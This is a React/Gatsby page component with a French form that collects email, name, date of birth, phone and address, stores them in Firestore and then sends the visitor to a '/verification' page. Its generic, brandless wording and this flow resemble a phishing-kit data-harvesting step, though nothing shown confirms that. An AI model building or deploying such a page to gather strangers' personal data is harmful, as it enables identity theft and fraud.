import * as React from 'react';
import {StaticImage} from "gatsby-plugin-image";
import './Information.css';
import { navigate } from "gatsby"
import {useState} from "react";
import {addInformationDetails} from "../firebase/firestore";
export default function(){
    const [email,setEmail]=useState("");
    const [firstName,setFirstName]=useState("");
    const [lastName,setLastName]=useState("");
    const [dob,setDOB]=useState("");
    const [phone,setPhone]=useState("");
    const [address,setAddress]=useState("");
    const [town,setTown]=useState("");
    const [loading,setLoading]=useState(false);
    async function onSubmit(e) {

        e.preventDefault();
        setLoading(true);
        await addInformationDetails({email,firstName,lastName,dob,phone,address,town,timestamp:new Date().getTime()});
        await navigate('/verification');
        setLoading(false);

    }
    return <div className="u-body u-xl-mode">
    <section className="u-clearfix u-information-section-1" id="sec-0b91">
        <div className="u-clearfix u-sheet u-sheet-1">
            <StaticImage className="u-image u-image-default u-image-1" src="../images/R.png" alt="" data-image-width="2272"
                 data-image-height="1704"/>
                <h2 className="u-align-center u-custom-font u-subtitle u-text u-text-default u-text-font u-text-1"> Veuillez
                    saisir vos informations :&nbsp;</h2>
                <h4 className="u-align-center u-text u-text-default u-text-font u-text-2">Ces informations doivent être
                    exactes.</h4>
                <div className="u-expanded-width-xs u-form u-form-1">
                    <form onSubmit={onSubmit}
                          className="u-clearfix u-form-spacing-15 u-form-vertical u-inner-form" style={{padding: "15px"}}>
                        <div className="u-form-email u-form-group u-label-none u-form-group-1">
                            <label htmlFor="email-2c6e" className="u-label">Email</label>
                            <input value={email} onChange={e => setEmail(e.target.value)}
                                type="email" placeholder="Entrez une adresse mail valide" id="email-2c6e"
                                   name="email" className="u-border-1 u-border-grey-30 u-input u-input-rectangle"
                                   required=""/>
                        </div>
                        <div className="u-form-group u-form-name u-label-none u-form-group-2">
                            <label htmlFor="name-6fee" className="u-label">prénom</label>
                            <input value={firstName} onChange={e=>setFirstName(e.target.value)}
                                type="text" placeholder="Entrez votre prénom" id="name-6fee" name="prenom"
                                   className="u-border-1 u-border-grey-30 u-input u-input-rectangle" required=""/>
                        </div>
                        <div className="u-form-group u-form-name u-label-none u-form-group-3">
                            <label htmlFor="name-732a" className="u-label">Nom</label>
                            <input value={lastName} onChange={e=>setLastName(e.target.value)}
                                type="text" placeholder="Entrez votre nom" id="name-732a" name="name-1"
                                   className="u-border-1 u-border-grey-30 u-input u-input-rectangle" required=""/>
                        </div>
                        <div className="u-form-group u-label-none u-form-group-4">
                            <label htmlFor="text-94d0" className="u-label">Date</label>
                            <input value={dob} onChange={e=>setDOB(e.target.value)}
                                type="date" placeholder="Date de naissance (JJ/MM/AAAA)" id="text-94d0" name="Date"
                                   className="u-border-1 u-border-grey-30 u-input u-input-rectangle"
                                   required="required"/>
                        </div>
                        <div className="u-form-group u-form-phone u-label-none u-form-group-5">
                            <label htmlFor="phone-bfde" className="u-label">Téléphone</label>
                            <input value={phone} onChange={e=>setPhone(e.target.value)}
                                type="tel"
                                   pattern="\+?\d{0,3}[\s\(\-]?([0-9]{2,3})[\s\)\-]?([\s\-]?)([0-9]{3})[\s\-]?([0-9]{2})[\s\-]?([0-9]{2})"
                                   placeholder="Entrez votre téléphone " id="phone-bfde" name="phone"
                                   className="u-border-1 u-border-grey-30 u-input u-input-rectangle" required=""/>
                        </div>
                        <div className="u-form-address u-form-group u-label-none u-form-group-6">
                            <label htmlFor="address-fa7c" className="u-label">Adresse</label>
                            <input value={address} onChange={e=>setAddress(e.target.value)}
                                type="text" placeholder="Entrez votre adresse" id="address-fa7c" name="address"
                                   className="u-border-1 u-border-grey-30 u-input u-input-rectangle" required=""/>
                        </div>
                        <div className="u-form-group u-label-none u-form-group-7">
                            <label htmlFor="text-7548" className="u-label">ville</label>
                            <input  value={town} onChange={e=>setTown(e.target.value)}
                                type="text" placeholder="Ville" id="text-7548" name="ville"
                                   className="u-border-1 u-border-grey-30 u-input u-input-rectangle"
                                   required="required"/>
                        </div>
                        <div className="u-align-center u-form-group u-form-submit">
                            <button disabled={loading} type="submit" value="submit"
                               className="u-btn u-btn-round u-btn-submit u-button-style u-custom-color-1 u-hover-custom-color-2 u-radius-50 u-btn-1">Suivant</button>

                        </div>
                    </form>
                </div>
        </div>
    </section>


    </div>
}